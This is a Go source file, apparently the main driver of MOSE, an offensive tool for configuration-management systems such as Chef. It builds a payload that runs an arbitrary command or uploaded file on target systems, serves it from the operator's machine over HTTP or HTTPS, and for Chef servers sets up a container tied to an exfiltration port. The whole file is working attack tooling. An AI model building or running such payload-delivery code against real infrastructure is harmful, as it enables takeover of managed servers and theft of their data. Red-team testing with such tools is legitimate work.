// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"context"
	"log"
	"os"
	"path"
	"path/filepath"
	"strings"
	"text/template"
	"time"

	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/MOSE/pkg/moseutils"
	utils "github.com/l50/goutils"
)

var (
	UserInput     moseutils.UserInput

	// Colorized output
	errmsg         = color.Red
	info           = color.Yellow
	msg            = color.Green
)

func generateParams() {
	paramLoc := filepath.Join("templates", UserInput.CMTarget)
	box := packr.New("Params", "|")
	box.ResolutionDir = paramLoc

	// Generate the params for a given target
	s, err := box.FindString("params.tmpl")

	if err != nil {
		log.Fatal(err)
	}

	t, err := template.New("params").Parse(s)

	if err != nil {
		log.Fatal(err)
	}

	f, err := os.Create("cmd/mose/" + UserInput.CMTarget + "/params.go")

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, UserInput)

	f.Close()

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	dir, _ := path.Split(UserInput.FilePath)

	// Check if dir exists and filePath isn't empty
	if _, err := os.Stat(dir); os.IsNotExist(err) && dir != "" && UserInput.FilePath != "" {
		log.Fatal("Location " + UserInput.FilePath + " does not exist")
	}

	if dir == "" && UserInput.FilePath != "" {
		dir, err := os.Getwd()
		if err != nil {
			log.Fatal("Couldn't get current working directory")
		}

		UserInput.FilePath = filepath.Join(dir, UserInput.FilePath)
	}

	// Set port option
	if !UserInput.ServeSSL && UserInput.WebSrvPort == 443 {
		UserInput.WebSrvPort = 8090
	}
}

func generatePayload() {
	log.Println(UserInput.Cmd)

	if UserInput.Cmd != "" {
		msg("Generating %s payload to run %s on a %s system, please wait...", UserInput.CMTarget, UserInput.Cmd, strings.ToLower(UserInput.OSTarget))
	} else {
		msg("Generating %s payload to run %s on a %s system, please wait...", UserInput.CMTarget, UserInput.FileUpload, strings.ToLower(UserInput.OSTarget))
	}

	prevDir := utils.Gwd()
	moseutils.Cd(filepath.Clean(filepath.Join("cmd/mose/", UserInput.CMTarget)))
	payload := filepath.Join("../../../payloads", UserInput.CMTarget+"-"+strings.ToLower(UserInput.OSTarget))

	if UserInput.Debug {
		log.Printf("Payload output name = %s", filepath.Base(payload))
		log.Printf("CM Target = %s", UserInput.CMTarget)
		log.Printf("OS Target = %s", UserInput.OSTarget)
		if UserInput.FileUpload != "" {
			log.Printf("File to upload and run = %s", UserInput.FileUpload)
		}
	}

	if UserInput.FileUpload != "" && UserInput.FilePath == "" {
		log.Printf("File Upload specified, copying file to payloads directory.")
		moseutils.CpFile(UserInput.FileUpload, filepath.Join("../../../payloads", filepath.Base(UserInput.FileUpload)))
	}

	if UserInput.FilePath != "" {
		msg("Creating binary at: " + UserInput.FilePath)
		payload = UserInput.FilePath
	}

	_, err := utils.RunCommand("env", "GOOS="+strings.ToLower(UserInput.OSTarget), "GOARCH=amd64", "go", "build", "-o", payload)

	if UserInput.Debug {
		log.Printf("Current directory: %s", utils.Gwd())
		log.Printf("env GOOS=" + strings.ToLower(UserInput.OSTarget) + " GOARCH=amd64" + " go" + " build" + " -o " + payload)
	}
	if err != nil {
		log.Fatalf("Error running the command to generate the target payload: %v", err)
	}

	moseutils.Cd(prevDir)
}

func setLocalIP() {
	if UserInput.LocalIP == "" {
		ip, err := moseutils.GetLocalIP()
		UserInput.LocalIP = ip
		if err != nil {
			log.Fatalln(err)
		}
	}
}

func servePayload(port int, ssl bool) {
	proto := "http"
	if ssl {
		proto = "https"
	}

	if UserInput.FileUpload != "" {
		msg("File upload command specified, being served at %s://%s:%d/files.tar for %d seconds", proto, UserInput.LocalIP, port, UserInput.TimeToServe)
	} else {
		msg("Payload being served at %s://%s:%d/%s-%s for %d seconds", proto, UserInput.LocalIP, port, UserInput.CMTarget, strings.ToLower(UserInput.OSTarget), UserInput.TimeToServe)
	}

	srv := moseutils.StartServer(port, "payloads", ssl, UserInput.SslCertPath, UserInput.SslKeyPath, time.Duration(UserInput.TimeToServe)*time.Second, true)

	info("Web server shutting down...")

	if err := srv.Shutdown(context.Background()); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	UserInput = moseutils.GetUserInput()
	setLocalIP()
	generateParams()
	generatePayload()
	// If the user hasn't specified to output the payload to a file, then serve it
	if UserInput.FileUpload != "" {
		targetBin := filepath.Join("payloads", UserInput.CMTarget+"-"+strings.ToLower(UserInput.OSTarget))
		files := []string{filepath.Join("payloads", filepath.Base(UserInput.FileUpload)), targetBin}
		log.Printf("Compressing files %v into payloads/files.tar", files)
		moseutils.TarFiles(files, "payloads/files.tar")
	}
	if UserInput.FilePath == "" && !UserInput.NoServe {
		servePayload(UserInput.WebSrvPort, UserInput.ServeSSL)
	}
	if UserInput.CMTarget == "chef" {
		ans1, err := moseutils.AskUserQuestion("Is your target a chef workstation?", UserInput.OSTarget)
		if err != nil {
			log.Fatal("Quitting")
		}
		if ans1 {
			log.Println("Nothing left to do on this system, continue all remaining activities on the target workstation.")
			os.Exit(0)
		}

		ans2, err := moseutils.AskUserQuestion("Is your target a chef server?", UserInput.OSTarget)
		if err != nil {
			log.Fatal("Quitting")
		}
		if ans2 {
			setupChefWorkstationContainer(UserInput.LocalIP, UserInput.ExfilPort, UserInput.OSTarget)
			os.Exit(0)
		}

		if !ans1 && !ans2 {
			log.Printf("Invalid chef target")
		}
	}
}
